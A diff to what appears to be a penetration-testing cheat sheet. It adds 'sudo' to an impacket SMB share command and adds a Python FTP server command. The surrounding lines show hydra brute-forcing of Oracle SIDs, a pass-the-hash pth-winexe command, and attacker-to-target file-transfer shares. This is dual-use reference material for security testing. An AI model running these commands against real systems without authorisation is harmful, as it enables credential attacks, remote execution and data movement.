@@ -1804,7 +1804,7 @@ hydra -L SID_wordlist_here -s 1521 IP_here oracle-sid
 
 # create public share for file transfer Win <--> Lin
 ## setup share on Lin
-/path/to/impacket-smbserver share_name_here full_path_here
+sudo /path/to/impacket-smbserver share_name_here full_path_here
 ## mount share on Win
 ### powershell
 New-PSDrive -Name "share_name_here_can_be_different_from_above" -PSProvider "FileSystem" -Root "\\Lin_IP_here\share_name_here"
@@ -3211,6 +3211,9 @@ pth-winexe -U domain_here/user_name_here%LM+NTLM_hash_here //SMB_share_here comm
 # user python path from env
 #!/usr/bin/env python
 #!/usr/bin/env python3
+
+# FTP server
+python3 -m pyftpdlib -p 21
 
 # HTTP server
 python -m SimpleHTTPServer 80
